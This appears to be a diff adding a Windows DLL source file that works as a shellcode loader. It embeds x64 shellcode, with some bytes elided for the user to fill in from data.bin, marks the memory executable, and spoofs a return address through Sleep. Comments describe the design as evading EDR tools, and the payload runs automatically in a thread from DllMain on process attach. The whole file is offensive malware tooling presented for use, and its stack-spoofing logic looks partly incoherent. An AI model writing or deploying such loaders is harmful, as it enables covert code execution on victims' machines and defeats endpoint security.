@@ -1,0 +1,88 @@
+#include <windows.h>
+
+// Include your binary shellcode (convert data.bin to hex array)
+unsigned char buf[] = 
+"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
+"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
+// ... (replace with your actual shellcode from data.bin, converted to hex)
+"\x48\x89\xc7\xe2\x8d\x59\x41\x58\x5e\x5a\x48\x8b\x12\xe9\x57"
+"\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48"
+// ... (ensure full shellcode from data.bin is pasted here)
+;
+
+void run_payload_spoofed() {
+    // Allocate read/write memory for shellcode
+    LPVOID exec_mem = VirtualAlloc(0, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (exec_mem == NULL) {
+        return; // Silent failure
+    }
+    
+    // Copy shellcode to memory
+    memcpy(exec_mem, buf, sizeof(buf));
+    
+    // Change memory to executable
+    DWORD oldProtect;
+    if (!VirtualProtect(exec_mem, sizeof(buf), PAGE_EXECUTE_READ, &oldProtect)) {
+        VirtualFree(exec_mem, 0, MEM_RELEASE);
+        return; // Silent failure
+    }
+    
+    // Basic stack spoofing: Create fake stack frame
+    CONTEXT ctx;
+    RtlCaptureContext(&ctx); // Get current thread context
+    
+    // Spoof return address to look like it came from Sleep (kernel32.dll)
+    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
+    LPVOID fake_return = (LPVOID)GetProcAddress(kernel32, "Sleep");
+    if (!fake_return) {
+        VirtualFree(exec_mem, 0, MEM_RELEASE);
+        return;
+    }
+    
+    // Allocate new stack for spoofing
+    LPVOID new_stack = VirtualAlloc(NULL, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!new_stack) {
+        VirtualFree(exec_mem, 0, MEM_RELEASE);
+        return;
+    }
+    
+    // Adjust stack pointer to end of new stack
+    LPVOID stack_top = (LPVOID)((char*)new_stack + 0x10000 - sizeof(LPVOID));
+    
+    // Push fake return address onto new stack
+    *(LPVOID*)stack_top = fake_return;
+    
+    // Small delay to evade some EDRs
+    Sleep(100);
+    
+    // Execute shellcode with spoofed stack
+    ctx.Rsp = (DWORD64)stack_top;
+    ctx.Rip = (DWORD64)exec_mem;
+    SetThreadContext(GetCurrentThread(), &ctx);
+    
+    // Execute (this won't return due to context switch)
+    ((void(*)())exec_mem)();
+    
+    // Clean up (unlikely to reach here)
+    VirtualFree(exec_mem, 0, MEM_RELEASE);
+    VirtualFree(new_stack, 0, MEM_RELEASE);
+}
+
+void WINAPI payload_thread(LPVOID lpParam) {
+    run_payload_spoofed();
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+        case DLL_PROCESS_ATTACH:
+            // Run payload in a new thread for evasion
+            HANDLE hThread = CreateThread(NULL, 0, payload_thread, NULL, 0, NULL);
+            if (hThread) {
+                CloseHandle(hThread);
+            }
+            break;
+        case DLL_PROCESS_DETACH:
+            break;
+    }
+    return TRUE;
+}
